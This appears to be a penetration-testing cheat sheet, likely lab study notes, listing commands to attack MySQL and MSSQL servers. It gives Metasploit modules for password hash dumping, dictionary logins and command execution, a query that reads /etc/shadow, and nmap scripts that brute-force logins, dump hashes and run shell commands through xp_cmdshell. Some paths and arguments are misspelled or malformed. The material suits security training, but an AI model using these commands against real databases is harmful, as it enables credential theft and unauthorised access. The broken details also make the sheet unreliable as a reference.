# **MYSQL**

Logging into Mysql on remote host -- ```mysql -h (IP address) -u root```

**Using database**  
```show databases ---then type semicolon```  
```use (database name);```  
```select count(*) from authors;```  
```select * from authors```  

**Finding Writable directories**  
Metasploit Module -- scanner/mysql/mysql_writable_dirs  
Finding hashes  -- ```use auxiliary/scanner/mysql/mysql_hashdump```  
Getting the full etc/shadow file -- ```select load_file("/etc/shadow");```

### Metasploit
Dictionary attack against Mysql  
**Login Module** -- auxiliary/scanner/mysql/mysql_login

User File -- /usr/share/metasploit-framework/data/wordlists/common_users.txt  
Password File -- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  

**Login Module**-- auxiliary/scanner/mysql/mysql_enum  
**SQL logins Module** -- auxiliary/scanner/mysql/mysql_enum_sql_logins
Execute commands -- Login Module -- auxiliary/scanner/mysql_exec  
Enumerate domain accounts -- Login Module -- auxiliary/scanner/mysql/mysql_enum_domain_accounts

# **MSSQL**

Nmap scripts  
```nmap (ip address) -p (port number) --script ms-sql-info```  
```nmap (ip address) -p (port number) --script ms-sql-ntlm-info --script-args mssql.instance-port=1433```  
```nmap (ip address) -p (port number) --script ms-sql-brute --script-args userdb=/root/Dessktop/wordlist/common_users.txt,passdb=/root/Dekstop/wordlist/100-common-passwords.txt```  
```nmap (ip address) -p (port number) --script ms-empty-password```  
```nmap (ip address) -p (port number) --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt```  
```nmap (ip address) -p (port number) --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria```  
```nmap (ip address) -p (port number) --script ms-sql-xp-cmdshell.cmd="type c:\flag.txt ```
